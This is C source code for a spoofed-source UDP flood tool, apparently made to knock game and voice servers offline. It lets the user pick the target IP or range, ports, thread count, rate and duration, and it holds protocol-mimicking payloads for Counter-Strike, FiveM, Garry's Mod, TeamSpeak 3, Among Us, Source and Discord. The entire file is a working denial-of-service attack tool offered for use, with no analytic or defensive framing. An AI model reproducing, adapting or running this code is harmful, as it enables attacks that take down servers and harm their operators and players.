/*
=============================================================================
			gcc -oterm -pthread -w udpcustom.c -o udpcustom
						----- CODED SponneR ------
=============================================================================
*/

#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9


#include <fcntl.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#define BUFFER_SIZE 1024


static unsigned int port;
static unsigned int sport;
static unsigned int lench;


char* packetstrx;
static uint32_t Q[4096], c = 362436;
struct thread_data { int thread_id; struct list* list_node; struct sockaddr_in sin; };
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

char sip[16];
char tip[16];
int s1, s2, s3, s4, s5;
int t1, t2, t3, t4, t5, t6, t7;

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};

unsigned short csum(unsigned short* ptr, int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return(answer);
}

void* flood(void* par1) {


	int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if (s == -1)
	{
		perror("Paket Acilmadi.");
		exit(1);
	}

	char datagram[4096], source_ip[32], classip[32], * data, * pseudogram;
	memset(datagram, 0, 4096);
	struct iphdr* iph = (struct iphdr*) datagram;
	struct udphdr* udph = (struct udphdr*) (datagram + sizeof(struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	sscanf(sip, "%d.%d.%d.%d/%d", &s1, &s2, &s3, &s4, &s5);
	sscanf(tip, "%d.%d.%d.%d/%d/%d/%d", &t1, &t2, &t3, &t4, &t5, &t6, &t7);

	int i = 0;


	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + lench;

	pseudogram = malloc(psize);

	memcpy((void*)udph + sizeof(struct udphdr), packetstrx, lench);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + lench;
	iph->id = htonl(rand() % 54321);
	iph->frag_off = 0;
	iph->ttl = 128;
	iph->protocol = 17;
	iph->check = 0;


	while (1) {

		if ((atoi(sip)) == 0) {

			snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);

		}
		else {

			if (s5 == 32) {

				snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, s2, s3, s4);

			}

			if (s5 == 24) {

				snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, s2, s3, rand() % 255);

			}

			if (s5 == 16) {

				snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, s2, rand() % 255, rand() % 255);

			}

			if (s5 == 8) {

				snprintf(source_ip, sizeof(source_ip) - 1, "%d.%d.%d.%d", s1, rand() % 255, rand() % 255, rand() % 255);

			}

		}


		sin.sin_family = AF_INET;
		sin.sin_port = htons(80);


		if (t5 == 24) {

			snprintf(classip, sizeof(classip) - 1, "%d.%d.%d.%d", t1, t2, t3, rand() % (t7 + 1 - t6) + t6);
			sin.sin_addr.s_addr = inet_addr(classip);

		}
		else {
			sin.sin_addr.s_addr = inet_addr(tip);
		}

		iph->saddr = inet_addr(source_ip);
		iph->daddr = sin.sin_addr.s_addr;
		iph->check = csum((unsigned short*)datagram, iph->tot_len);
		if (sport == 0) { udph->source = htons(15000 + rand() % 45000); }
		else { udph->source = sport; }
		if (port == 0) { udph->dest = htons(1 + rand() % 15000); }
		else { udph->dest = port; }
		udph->len = htons(sizeof(struct udphdr) + lench);
		udph->check = 0;
		psh.source_address = inet_addr(source_ip);
		psh.dest_address = sin.sin_addr.s_addr;
		psh.placeholder = 0;
		psh.protocol = IPPROTO_UDP;
		psh.udp_length = htons(sizeof(struct udphdr) + lench);
		memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
		memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + lench);
		udph->check = csum((unsigned short*)pseudogram, psize);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & sin, sizeof(sin));
		pps++;
		if (i >= limiter) {
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}


int main(int argc, char* argv[]) {
	if (argc < 8) {
		fprintf(stdout, "Invalid syntac! UDP Custom by random turk to forky\n");
		fprintf(stdout, "Usage: %s <Target IP/24/MIN/MAX CLASS> <DST PORT/0 FOR RANDOM> <SRC PORT/0 FOR RANDOM> <127.0.0.1/32 / 0 FOR RANDOM> <THREAD> <PPS LIMIT, -1 NO LIMIT> <TIME> <cs16,fivem,fivem2,gmod,csgo,ts3,amongus,source>\n", argv[0]);
		exit(-1);
	}
	int i = 0;
	int max_len = 128;
	char* buffer = (char*)malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[5]);
	int maxpps = atoi(argv[6]);
	limiter = 0;
	pps = 0;
	int multiplier = 20;
	pthread_t thread[num_threads];
	struct thread_data td[num_threads];
	port = htons(atoi(argv[2]));
	sport = htons(atoi(argv[3]));
	strcpy(tip, argv[1]);
	strcpy(sip, argv[4]);
	char* oyun = argv[8];

	if (strcmp(oyun, "cs16") == 0) {
		fprintf(stdout, "COUNTER-STRIKE 1.6\n");
		lench = 23;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x73\x74\x65\x61\x6d\x0a";
	}

	if (strcmp(oyun, "fivem") == 0) {
		fprintf(stdout, "FIVEM (GTA5)\n");
		lench = 15;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x78\x78";
	}

	if (strcmp(oyun, "fivem2") == 0) {
		fprintf(stdout, "Fivem-New\n");
		lench = 65;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\x74\x6f\x6b\x65\x6e\x3d\x64\x66\x39\x36\x61\x66\x30\x33\x2d\x63\x32\x66\x63\x2d\x34\x63\x32\x39\x2d\x39\x31\x39\x61\x2d\x32\x36\x30\x35\x61\x61\x37\x30\x62\x31\x66\x38\x26\x67\x75\x69\x64\x3d\x37\x36\x35\x36\x31\x31\x39\x38\x38\x30\x34\x38\x30\x36\x30\x31\x35";
	}

	if (strcmp(oyun, "gmod") == 0) {
		fprintf(stdout, "Garrys Mod\n");
		lench = 23;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xff\xff\xff\xff\x71\x96\x9e\x53\x05\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x00";
	}

	if (strcmp(oyun, "csgo") == 0) {
		fprintf(stdout, "CS-GO\n");
		lench = 23;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xff\xff\xff\xff\x71\x63\x6f\x6e\x6e\x65\x63\x74\x30\x78\x30\x30\x30\x30\x30\x30\x30\x30\x00";
	}

	if (strcmp(oyun, "ts3") == 0) {
		fprintf(stdout, "TEAMSPEAK3\n");
		lench = 34;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x0c\x26\x87\xdd\x00\x5d\x36\xdb\xe3\xae\xa9\xc3\x8d\x00\x00\x00\x00\x00\x00\x00\x00";
	}

	if (strcmp(oyun, "amongus") == 0) {
		fprintf(stdout, "Among Us\n");
		lench = 13;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xe3\x54\x0a\x4f\x6e\x6c\x69\x6e\x65\x47\x61\x6d\x65";
	}

	if (strcmp(oyun, "source") == 0) {
		fprintf(stdout, "TSource Engine\n");
		lench = 25;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
	}
	
	if (strcmp(oyun, "discord1") == 0) {
		fprintf(stdout, "Discord1\n");
		lench = 16;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\x13\x37\xca\xfe\x01\x00\x00\x00";
	}
	
	if (strcmp(oyun, "discord2") == 0) {
		fprintf(stdout, "Discord2\n");
		lench = 39;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\x94\x00\xb0\x1a\xef\x69\xa8\xa1\x59\x69\xba\xc5\x08\x00\x45\x00\x00\x43\xf0\x12\x00\x00\x80\x11\x00\x00\xc0\xa8\x64\x02\xb9\x29\x8e\x31\xc2\x30\xc3\x51\x00\x2f\x6c\x46\x90\xf8\x5f\x1b\x8e\xf5\x56\x8f\x00\x05\xe1\x26\x96\xa9\xde\xe8\x84\xba\x65\x38\x70\x68\xf5\x70\x0e\x12\xe2\x54\x20\xe0\x7f\x49\x0d\x9e\x44\x89\xec\x4b\x7f";
	}

	for (i = 0;i < num_threads;i++) {
		pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
	}
	fprintf(stdout, "UDP Bypass\n");
	for (i = 0;i < (atoi(argv[7]) * multiplier);i++)
	{
		usleep((1000 / multiplier) * 1000);
		if ((pps * multiplier) > maxpps)
		{
			if (1 > limiter)
			{
				sleeptime += 100;
			}
			else {
				limiter--;
			}
		}
		else {
			limiter++;
			if (sleeptime > 25)
			{
				sleeptime -= 25;
			}
			else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}
	return 0;
}
